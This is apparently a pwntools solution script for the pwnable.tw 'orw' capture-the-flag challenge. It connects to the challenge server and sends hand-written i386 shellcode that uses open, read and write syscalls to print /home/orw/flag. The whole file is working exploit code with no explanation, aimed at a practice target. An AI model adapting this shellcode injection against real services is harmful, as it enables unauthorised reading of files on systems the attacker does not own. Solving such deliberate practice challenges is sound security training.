from pwn import *
context.clear(arch='i386',os='linux')
r = remote('chall.pwnable.tw', 10001)
#r = process('./orw')
code = '''
push 26465
push 1818636151
push 1919889253
push 1836017711

mov eax, 5
mov ebx, esp 
mov ecx, 0
mov edx, 0
int 0x80

sub esp, 100

mov edi, eax
mov eax, 3 
mov ebx, edi 
mov ecx, esp 
mov edx, 100 
int 0x80 

mov eax, 4
mov ebx, 1 
mov ecx, esp 
mov edx, 100
int 0x80

filename: .asciz "/home/orw/flag"
'''
r.sendline(asm(code))
r.interactive()
